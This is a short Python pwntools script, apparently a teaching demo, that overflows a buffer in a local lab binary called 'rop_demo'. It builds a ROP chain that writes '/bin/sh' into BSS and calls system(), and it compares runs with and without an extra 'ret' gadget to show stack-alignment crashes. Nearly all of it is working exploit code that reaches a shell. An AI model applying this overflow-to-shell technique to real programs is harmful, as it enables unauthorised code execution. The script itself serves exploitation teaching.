#!/usr/bin/env python3
# Why you sometimes must insert a bare `ret` gadget at the head of a ROP chain:
# inserting one extra 8-byte slot shifts rsp by 8 bytes -> system()'s SSE spills
# land on a non-16-byte-aligned address -> SIGSEGV in movaps.
from pwn import *
context.arch = 'amd64'; context.log_level = 'error'
e = ELF('./rop_demo', checksec=False)
POP = e.symbols['gadget_pop_rdi_ret']
RET = 0x40101a                       # bare `ret`
BSS = e.bss(0x200)
for label, extra in (('aligned chain        ', b''),
                     ('chain + one extra ret', p64(RET))):
    payload  = b'A' * (0x40 + 8) + extra
    payload += p64(POP) + p64(BSS) + p64(e.symbols['mygets'])
    payload += p64(POP) + p64(BSS) + p64(e.plt['system'])
    io = process('./rop_demo')
    io.recvuntil(b'line:\n')
    io.sendline(payload); io.sendline(b'/bin/sh'); io.sendline(b'echo SHELL_REACHED')
    d = io.recvrepeat(2)
    print('%s -> %s' % (label, 'SHELL OK' if b'SHELL_REACHED' in d else 'SIGSEGV, no shell'))
    io.close()
